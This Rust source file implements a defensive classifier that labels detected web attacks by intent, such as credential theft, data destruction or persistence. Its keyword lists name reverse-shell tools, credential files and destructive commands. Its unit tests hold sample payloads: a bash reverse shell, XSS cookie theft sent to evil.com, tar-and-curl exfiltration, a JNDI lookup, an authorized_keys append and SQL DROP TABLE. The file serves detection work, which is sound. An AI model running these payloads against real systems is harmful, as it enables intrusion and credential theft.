//! Intent Classifier — Semantic Attack Intent Analysis
//!
//! Detection answers: "IS this an attack?"
//! Intent classification answers: "WHAT WOULD this attack DO?"
//!
//! Intent categories (ordered by severity):
//!   - ExfiltrateCredentials: targeting passwords, tokens, keys, secrets
//!   - DestroyData: DROP, DELETE, TRUNCATE — irrecoverable damage
//!   - CodeExecution: arbitrary command/code execution
//!   - EstablishPersistence: backdoor, user creation, cron injection
//!   - EscalatePrivilege: admin promotion, role manipulation
//!   - ExfiltrateData: general data theft
//!   - DenialOfService: resource exhaustion
//!   - Enumerate: schema discovery, user listing
//!   - Reconnaissance: error-based probing, timing attacks
//!   - Unknown: attack detected but intent unclear
//!
//! POST-DETECTION analysis — zero false positives by design.

use crate::types::InvariantClass;
use std::collections::HashSet;

// ── Intent Categories ─────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum AttackIntent {
    ExfiltrateCredentials,
    DestroyData,
    CodeExecution,
    EstablishPersistence,
    EscalatePrivilege,
    ExfiltrateData,
    DenialOfService,
    Enumerate,
    Reconnaissance,
    Unknown,
}

impl AttackIntent {
    /// Severity multiplier for this intent (0.0–1.0, higher = more dangerous).
    pub fn severity(self) -> f64 {
        match self {
            Self::ExfiltrateCredentials => 1.00,
            Self::DestroyData => 0.98,
            Self::CodeExecution => 0.97,
            Self::EstablishPersistence => 0.95,
            Self::EscalatePrivilege => 0.93,
            Self::ExfiltrateData => 0.85,
            Self::DenialOfService => 0.75,
            Self::Enumerate => 0.60,
            Self::Reconnaissance => 0.45,
            Self::Unknown => 0.30,
        }
    }
}

// ── Classification Result ─────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct IntentClassification {
    pub primary_intent: AttackIntent,
    pub intents: Vec<AttackIntent>,
    pub confidence: f64,
    pub detail: String,
    pub severity_multiplier: f64,
    pub targets: Vec<String>,
}

// ── Regex-free Pattern Matching ───────────────────────────────────

fn contains_ci(haystack: &str, needle: &str) -> bool {
    let h = haystack.to_lowercase();
    let n = needle.to_lowercase();
    h.contains(&n)
}

fn matches_any_ci(input: &str, patterns: &[&str]) -> bool {
    let lower = input.to_lowercase();
    patterns.iter().any(|p| lower.contains(&p.to_lowercase()))
}

fn has_sql_class(classes: &[InvariantClass]) -> bool {
    classes.iter().any(|c| matches!(c,
        InvariantClass::SqlTautology | InvariantClass::SqlStringTermination |
        InvariantClass::SqlUnionExtraction | InvariantClass::SqlStackedExecution |
        InvariantClass::SqlTimeOracle | InvariantClass::SqlErrorOracle |
        InvariantClass::SqlCommentTruncation | InvariantClass::JsonSqlBypass
    ))
}

fn has_cmd_class(classes: &[InvariantClass]) -> bool {
    classes.iter().any(|c| matches!(c,
        InvariantClass::CmdSeparator | InvariantClass::CmdSubstitution |
        InvariantClass::CmdArgumentInjection
    ))
}

fn has_xss_class(classes: &[InvariantClass]) -> bool {
    classes.iter().any(|c| matches!(c,
        InvariantClass::XssTagInjection | InvariantClass::XssAttributeEscape |
        InvariantClass::XssEventHandler | InvariantClass::XssProtocolHandler |
        InvariantClass::XssTemplateExpression
    ))
}

fn has_path_class(classes: &[InvariantClass]) -> bool {
    classes.iter().any(|c| matches!(c,
        InvariantClass::PathDotdotEscape | InvariantClass::PathEncodingBypass |
        InvariantClass::PathNullTerminate | InvariantClass::PathNormalizationBypass
    ))
}

fn has_ssti_class(classes: &[InvariantClass]) -> bool {
    classes.iter().any(|c| matches!(c,
        InvariantClass::SstiJinjaTwig | InvariantClass::SstiElExpression
    ))
}

fn has_deser_class(classes: &[InvariantClass]) -> bool {
    classes.iter().any(|c| matches!(c,
        InvariantClass::DeserJavaGadget | InvariantClass::DeserPhpObject |
        InvariantClass::DeserPythonPickle
    ))
}

fn has_auth_class(classes: &[InvariantClass]) -> bool {
    classes.iter().any(|c| matches!(c,
        InvariantClass::AuthNoneAlgorithm | InvariantClass::AuthHeaderSpoof |
        InvariantClass::JwtKidInjection | InvariantClass::JwtJwkEmbedding |
        InvariantClass::JwtConfusion
    ))
}

fn has_nosql_class(classes: &[InvariantClass]) -> bool {
    classes.iter().any(|c| matches!(c,
        InvariantClass::NosqlOperatorInjection | InvariantClass::NosqlJsInjection
    ))
}

// ── SQL Intent Patterns ───────────────────────────────────────────

const SQL_CRED_TARGETS: &[&str] = &[
    "password", "passwd", "pwd", "secret", "token", "api_key", "apikey",
    "credential", "hash", "salt", "private_key", "ssn", "credit_card", "cc_num",
];

const SQL_USER_TABLES: &[&str] = &[
    "users", "user", "accounts", "account", "admins", "admin",
    "members", "auth", "login", "credentials", "staff", "employees",
];

const SQL_DESTRUCTIVE: &[&str] = &["drop table", "drop database", "drop schema", "delete from", "truncate"];

const SQL_PERSIST: &[&str] = &["insert into", "create user", "create login", "create role", "grant all", "into outfile", "into dumpfile"];

const SQL_ENUMERATE: &[&str] = &[
    "information_schema", "pg_catalog", "sys.tables", "sys.columns",
    "sqlite_master", "show tables", "show databases", "show columns",
    "table_name", "column_name", "schema_name",
];

const SQL_DOS: &[&str] = &["benchmark", "sleep", "waitfor delay", "pg_sleep", "randomblob", "generate_series"];

const SQL_RECON: &[&str] = &["@@version", "version()", "@@datadir", "current_user", "system_user", "session_user"];

// ── CMD Intent Patterns ───────────────────────────────────────────

const CMD_CRED_TARGETS: &[&str] = &[
    "/etc/passwd", "/etc/shadow", ".ssh/", "id_rsa", ".aws/credentials",
    ".env", ".git/config", ".docker/config", ".kube/config", "web.config",
    "wp-config.php", "appsettings.json", "database.yml",
];

const CMD_REVERSE_SHELL: &[&str] = &[
    "/bin/sh", "/bin/bash", "nc -", "ncat ", "netcat ", "mkfifo", "/dev/tcp", "socat ",
];

const CMD_PERSIST: &[&str] = &["crontab", "/etc/cron", ".bashrc", ".profile", ".bash_profile", "systemctl enable", "chmod +s"];

const CMD_DESTRUCTIVE: &[&str] = &["rm -rf", "mkfs.", "dd if=", "shred ", "wipe "];

const CMD_LATERAL_MOVEMENT: &[&str] = &[
    "psexec", "wmic /node:", "winrm", "ssh ", "smb://", "net use \\\\",
    "kubectl exec", "docker exec", "ansible ", "mstsc ",
];

const CMD_STAGE_DATA: &[&str] = &[
    "tar -", "zip ", "7z ", "gzip ", "base64 ", "xxd -p", "/tmp/", "/var/tmp/",
];

const CMD_EXFIL_CHANNELS: &[&str] = &[
    "curl ", "wget ", "nc ", "scp ", "ftp ", "tftp ", "http://", "https://", "dns://",
];

const CMD_RECON: &[&str] = &[
    "whoami", "id", "uname -a", "ifconfig", "ipconfig", "net user", "arp -a",
    "route ", "tracert", "nslookup", "nmap ", "/proc/version",
];

// ── XSS Intent Patterns ──────────────────────────────────────────

const XSS_COOKIE_THEFT: &[&str] = &["document.cookie", "localstorage", "sessionstorage", ".getitem("];

const XSS_REDIRECT: &[&str] = &["location.href", "location.replace", "window.location", "document.location"];

// ── Path Intent Patterns ─────────────────────────────────────────

const PATH_CRED_TARGETS: &[&str] = &[
    "/etc/passwd", "/etc/shadow", ".ssh/", "id_rsa", ".env", ".git/",
    ".aws/", ".docker/", "web.config", ".htpasswd",
];

// ── Classifier ────────────────────────────────────────────────────

/// Classify the semantic intent of a detected attack.
pub fn classify_intent(
    detected_classes: &[InvariantClass],
    input: &str,
    _path: Option<&str>,
) -> IntentClassification {
    let class_set: HashSet<_> = detected_classes.iter().cloned().collect();
    let mut intents: Vec<AttackIntent> = Vec::new();
    let mut targets: Vec<String> = Vec::new();
    let mut details: Vec<&str> = Vec::new();
    let lower = input.to_lowercase();
    let path_lower = _path.unwrap_or("").to_lowercase();

    // ── SQL injection intent ──
    if has_sql_class(detected_classes) {
        if matches_any_ci(input, SQL_CRED_TARGETS) || (matches_any_ci(input, SQL_USER_TABLES) && contains_ci(input, "select")) {
            intents.push(AttackIntent::ExfiltrateCredentials);
            details.push("SQL credential extraction");
            for t in SQL_USER_TABLES {
                if contains_ci(input, t) { targets.push(format!("table:{}", t)); break; }
            }
            for c in SQL_CRED_TARGETS {
                if contains_ci(input, c) { targets.push(format!("column:{}", c)); break; }
            }
        }
        if matches_any_ci(input, SQL_DESTRUCTIVE) {
            intents.push(AttackIntent::DestroyData);
            details.push("SQL destructive operation");
        }
        if matches_any_ci(input, SQL_PERSIST) {
            intents.push(AttackIntent::EstablishPersistence);
            details.push("SQL persistence (file write or user creation)");
        }
        if matches_any_ci(input, SQL_ENUMERATE) {
            intents.push(AttackIntent::Enumerate);
            details.push("SQL schema enumeration");
        }
        if matches_any_ci(input, SQL_DOS) {
            intents.push(AttackIntent::DenialOfService);
            details.push("SQL time-based DoS");
        }
        if matches_any_ci(input, SQL_RECON) {
            intents.push(AttackIntent::Reconnaissance);
            details.push("SQL version/environment fingerprinting");
        }
        if contains_ci(input, "union") && contains_ci(input, "select") && !intents.contains(&AttackIntent::ExfiltrateCredentials) {
            intents.push(AttackIntent::ExfiltrateData);
            details.push("SQL data extraction via UNION");
        }
    }

    // ── Command injection intent ──
    if has_cmd_class(detected_classes) {
        if matches_any_ci(input, CMD_REVERSE_SHELL) {
            intents.push(AttackIntent::CodeExecution);
            intents.push(AttackIntent::EstablishPersistence);
            details.push("Reverse shell establishment");
        }
        if matches_any_ci(input, CMD_CRED_TARGETS) {
            intents.push(AttackIntent::ExfiltrateCredentials);
            for t in CMD_CRED_TARGETS {
                if contains_ci(input, t) { targets.push(format!("file:{}", t)); break; }
            }
            details.push("Command injection targeting credentials");
        }
        if matches_any_ci(input, CMD_PERSIST) {
            intents.push(AttackIntent::EstablishPersistence);
            details.push("Command injection persistence mechanism");
        }
        if matches_any_ci(input, CMD_DESTRUCTIVE) {
            intents.push(AttackIntent::DestroyData);
            details.push("Command injection destructive operation");
        }
        if matches_any_ci(input, CMD_LATERAL_MOVEMENT) {
            intents.push(AttackIntent::EscalatePrivilege);
            details.push("Command injection lateral movement");
        }
        if matches_any_ci(input, CMD_RECON) {
            intents.push(AttackIntent::Reconnaissance);
            details.push("Command execution reconnaissance");
        }
        if matches_any_ci(input, CMD_STAGE_DATA) && matches_any_ci(input, CMD_EXFIL_CHANNELS) {
            intents.push(AttackIntent::ExfiltrateData);
            details.push("Data staging followed by exfiltration channel");
        }
        if !intents.iter().any(|i| matches!(i, AttackIntent::CodeExecution | AttackIntent::EstablishPersistence | AttackIntent::DestroyData)) {
            intents.push(AttackIntent::CodeExecution);
            details.push("Command execution");
        }
    }

    // ── XSS intent ──
    if has_xss_class(detected_classes) {
        if matches_any_ci(input, XSS_COOKIE_THEFT) {
            intents.push(AttackIntent::ExfiltrateCredentials);
            targets.push("session:cookie".to_string());
            details.push("XSS session theft");
        }
        if matches_any_ci(input, XSS_REDIRECT) {
            intents.push(AttackIntent::ExfiltrateData);
            details.push("XSS redirect/phishing");
        }
        if !intents.iter().any(|i| matches!(i, AttackIntent::ExfiltrateCredentials | AttackIntent::ExfiltrateData)) {
            intents.push(AttackIntent::CodeExecution);
            details.push("XSS code execution in browser");
        }
    }

    // ── Path traversal intent ──
    if has_path_class(detected_classes) {
        if matches_any_ci(input, PATH_CRED_TARGETS) {
            intents.push(AttackIntent::ExfiltrateCredentials);
            for t in PATH_CRED_TARGETS {
                if contains_ci(input, t) { targets.push(format!("file:{}", t)); break; }
            }
            details.push("Path traversal targeting credentials");
        } else {
            intents.push(AttackIntent::Reconnaissance);
            details.push("Path traversal probing");
        }
    }

    // ── SSRF intent ──
    if class_set.contains(&InvariantClass::SsrfCloudMetadata) {
        intents.push(AttackIntent::ExfiltrateCredentials);
        targets.push("service:cloud_metadata".to_string());
        details.push("SSRF targeting cloud credentials (IMDS)");
    } else if class_set.contains(&InvariantClass::SsrfInternalReach) || class_set.contains(&InvariantClass::SsrfProtocolSmuggle) {
        intents.push(AttackIntent::Reconnaissance);
        details.push("SSRF internal network probing");
    }

    // ── Deserialization intent ──
    if has_deser_class(detected_classes) {
        intents.push(AttackIntent::CodeExecution);
        details.push("Deserialization remote code execution");
    }

    // ── SSTI intent ──
    if has_ssti_class(detected_classes) {
        intents.push(AttackIntent::CodeExecution);
        if lower.contains("exec(") || lower.contains("popen(") || lower.contains("getruntime()") {
            details.push("SSTI to RCE");
        } else {
            details.push("SSTI code execution");
        }
    }

    // ── Auth bypass intent ──
    if has_auth_class(detected_classes) {
        intents.push(AttackIntent::EscalatePrivilege);
        details.push("Authentication/authorization bypass");
    }

    // ── XXE intent ──
    if class_set.contains(&InvariantClass::XxeEntityExpansion) {
        if lower.contains("file://") || lower.contains("/etc/passwd") {
            intents.push(AttackIntent::ExfiltrateData);
            details.push("XXE file disclosure");
        } else {
            intents.push(AttackIntent::ExfiltrateData);
            details.push("XXE data extraction");
        }
    }

    // ── Log4Shell intent ──
    if class_set.contains(&InvariantClass::LogJndiLookup) {
        intents.push(AttackIntent::CodeExecution);
        intents.push(AttackIntent::EstablishPersistence);
        details.push("Log4Shell JNDI remote class loading");
    }

    // ── LLM attacks ──
    if class_set.contains(&InvariantClass::LlmDataExfiltration) {
        intents.push(AttackIntent::ExfiltrateData);
        details.push("LLM data exfiltration");
    }
    if class_set.contains(&InvariantClass::LlmPromptInjection) || class_set.contains(&InvariantClass::LlmJailbreak) {
        intents.push(AttackIntent::EscalatePrivilege);
        details.push("LLM instruction override");
    }

    // ── Supply chain ──
    if class_set.contains(&InvariantClass::DependencyConfusion) || class_set.contains(&InvariantClass::PostinstallInjection) {
        intents.push(AttackIntent::CodeExecution);
        intents.push(AttackIntent::EstablishPersistence);
        details.push("Supply chain code execution");
    }
    if class_set.contains(&InvariantClass::EnvExfiltration) {
        intents.push(AttackIntent::ExfiltrateCredentials);
        details.push("Environment variable credential theft");
    }

    // ── Prototype pollution ──
    if class_set.contains(&InvariantClass::ProtoPollution) {
        intents.push(AttackIntent::EscalatePrivilege);
        details.push("Prototype pollution property injection");
    }

    // ── GraphQL abuse ──
    if class_set.contains(&InvariantClass::GraphqlBatchAbuse) {
        intents.push(AttackIntent::DenialOfService);
        details.push("GraphQL DoS");
    }
    if class_set.contains(&InvariantClass::GraphqlIntrospection) {
        intents.push(AttackIntent::Enumerate);
        details.push("GraphQL schema enumeration");
    }

    // ── NoSQL ──
    if has_nosql_class(detected_classes) {
        if lower.contains("$ne") || lower.contains("$gt") || lower.contains("$regex") {
            intents.push(AttackIntent::EscalatePrivilege);
            details.push("NoSQL authentication bypass");
        } else {
            intents.push(AttackIntent::ExfiltrateData);
            details.push("NoSQL data extraction");
        }
    }

    // ── Cross-domain behavioral signals ──
    if (has_cmd_class(detected_classes) || has_ssti_class(detected_classes) || has_deser_class(detected_classes))
        && (lower.contains("authorized_keys")
            || lower.contains("registry run")
            || lower.contains("startup")
            || lower.contains("schtasks")
            || lower.contains("launchctl"))
    {
        intents.push(AttackIntent::EstablishPersistence);
        details.push("Persistence mechanism artifact");
    }

    if (class_set.contains(&InvariantClass::SsrfInternalReach) || class_set.contains(&InvariantClass::SsrfProtocolSmuggle))
        && (lower.contains("169.254.169.254")
            || lower.contains("127.0.0.1")
            || lower.contains("localhost")
            || lower.contains("10.")
            || lower.contains("172.16.")
            || lower.contains("192.168."))
    {
        intents.push(AttackIntent::Reconnaissance);
        details.push("Internal network lateral reconnaissance");
    }

    if (path_lower.contains("/admin")
        || path_lower.contains("/actuator")
        || path_lower.contains("/internal")
        || path_lower.contains("/debug"))
        && intents.iter().any(|i| matches!(i, AttackIntent::Reconnaissance | AttackIntent::Enumerate))
        && intents.iter().any(|i| !matches!(i, AttackIntent::Reconnaissance | AttackIntent::Enumerate))
    {
        intents.push(AttackIntent::EscalatePrivilege);
        details.push("Reconnaissance targeting privileged path");
    }

    // ── Deduplicate ──
    let mut unique_intents: Vec<AttackIntent> = Vec::new();
    let mut seen = HashSet::new();
    for intent in &intents {
        if seen.insert(*intent) {
            unique_intents.push(*intent);
        }
    }

    if unique_intents.is_empty() {
        unique_intents.push(AttackIntent::Unknown);
        details.push("Attack detected but specific intent unclear");
    }

    // Primary intent = highest severity
    let primary_intent = *unique_intents.iter()
        .max_by(|a, b| a.severity().partial_cmp(&b.severity()).unwrap())
        .unwrap();

    let confidence = if unique_intents.len() == 1 && unique_intents[0] == AttackIntent::Unknown {
        0.30
    } else {
        let has_high_impact = unique_intents.iter().any(|i| matches!(
            i,
            AttackIntent::ExfiltrateCredentials
                | AttackIntent::DestroyData
                | AttackIntent::CodeExecution
                | AttackIntent::EstablishPersistence
                | AttackIntent::EscalatePrivilege
        ));
        let has_recon = unique_intents.iter().any(|i| matches!(i, AttackIntent::Reconnaissance | AttackIntent::Enumerate));
        let recon_only = unique_intents.iter().all(|i| matches!(i, AttackIntent::Reconnaissance | AttackIntent::Enumerate));

        let mut conf = 0.62_f64
            + if !targets.is_empty() { 0.12 } else { 0.0 }
            + if unique_intents.len() > 1 { 0.08 } else { 0.0 }
            + if has_high_impact { 0.10 } else { 0.0 }
            + if has_high_impact && has_recon { 0.05 } else { 0.0 };
        if recon_only {
            conf = 0.55;
        } else if has_recon {
            conf = conf.min(0.70);
        }
        conf.clamp(0.35, 0.99)
    };

    // Deduplicate targets
    let mut unique_targets: Vec<String> = Vec::new();
    let mut seen_targets = HashSet::new();
    for t in &targets {
        if seen_targets.insert(t.clone()) {
            unique_targets.push(t.clone());
        }
    }

    IntentClassification {
        primary_intent,
        intents: unique_intents,
        confidence,
        detail: details.join("; "),
        severity_multiplier: primary_intent.severity(),
        targets: unique_targets,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sql_credential_extraction() {
        let r = classify_intent(
            &[InvariantClass::SqlUnionExtraction],
            "' UNION SELECT password, username FROM users --",
            None,
        );
        assert_eq!(r.primary_intent, AttackIntent::ExfiltrateCredentials);
        assert!(r.confidence > 0.80);
        assert!(!r.targets.is_empty());
    }

    #[test]
    fn sql_destructive() {
        let r = classify_intent(
            &[InvariantClass::SqlStackedExecution],
            "'; DROP TABLE users; --",
            None,
        );
        assert!(r.intents.contains(&AttackIntent::DestroyData));
    }

    #[test]
    fn cmd_reverse_shell() {
        let r = classify_intent(
            &[InvariantClass::CmdSeparator],
            "; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            None,
        );
        assert!(r.intents.contains(&AttackIntent::CodeExecution));
        assert!(r.intents.contains(&AttackIntent::EstablishPersistence));
    }

    #[test]
    fn xss_cookie_theft() {
        let r = classify_intent(
            &[InvariantClass::XssEventHandler],
            "<img onerror=fetch('//evil.com?c='+document.cookie)>",
            None,
        );
        assert_eq!(r.primary_intent, AttackIntent::ExfiltrateCredentials);
    }

    #[test]
    fn path_credential_file() {
        let r = classify_intent(
            &[InvariantClass::PathDotdotEscape],
            "../../../../etc/shadow",
            None,
        );
        assert_eq!(r.primary_intent, AttackIntent::ExfiltrateCredentials);
        assert!(r.targets.iter().any(|t| t.contains("/etc/shadow")));
    }

    #[test]
    fn ssrf_cloud_metadata() {
        let r = classify_intent(
            &[InvariantClass::SsrfCloudMetadata],
            "http://169.254.169.254/latest/meta-data/iam/",
            None,
        );
        assert_eq!(r.primary_intent, AttackIntent::ExfiltrateCredentials);
    }

    #[test]
    fn log4shell() {
        let r = classify_intent(
            &[InvariantClass::LogJndiLookup],
            "${jndi:ldap://evil.com/a}",
            None,
        );
        assert!(r.intents.contains(&AttackIntent::CodeExecution));
        assert!(r.intents.contains(&AttackIntent::EstablishPersistence));
    }

    #[test]
    fn unknown_intent_fallback() {
        let r = classify_intent(&[InvariantClass::CrlfHeaderInjection], "foo\r\nbar", None);
        assert_eq!(r.primary_intent, AttackIntent::Unknown);
        assert!((r.confidence - 0.30).abs() < 0.01);
    }

    #[test]
    fn sql_enumerate() {
        let r = classify_intent(
            &[InvariantClass::SqlUnionExtraction],
            "' UNION SELECT table_name FROM information_schema.tables --",
            None,
        );
        assert!(r.intents.contains(&AttackIntent::Enumerate));
    }

    #[test]
    fn recon_only_has_lower_confidence() {
        let r = classify_intent(
            &[InvariantClass::SsrfInternalReach],
            "http://10.0.0.12:8080/health",
            Some("/internal/health"),
        );
        assert!(r.intents.contains(&AttackIntent::Reconnaissance));
        assert!(r.confidence < 0.75, "recon-only confidence should be moderated: {}", r.confidence);
    }

    #[test]
    fn cmd_data_staging_before_exfiltration() {
        let r = classify_intent(
            &[InvariantClass::CmdSeparator],
            "; tar czf /tmp/.cache.tgz /etc && curl -F file=@/tmp/.cache.tgz https://evil.example/upload",
            None,
        );
        assert!(r.intents.contains(&AttackIntent::ExfiltrateData));
    }

    #[test]
    fn cmd_lateral_movement_signal() {
        let r = classify_intent(
            &[InvariantClass::CmdSubstitution],
            "$(wmic /node:10.0.0.22 process call create cmd.exe)",
            None,
        );
        assert!(r.intents.contains(&AttackIntent::EscalatePrivilege));
    }

    #[test]
    fn persistence_mechanism_signal() {
        let r = classify_intent(
            &[InvariantClass::CmdArgumentInjection],
            "--run='echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC >> ~/.ssh/authorized_keys'",
            None,
        );
        assert!(r.intents.contains(&AttackIntent::EstablishPersistence));
    }
}
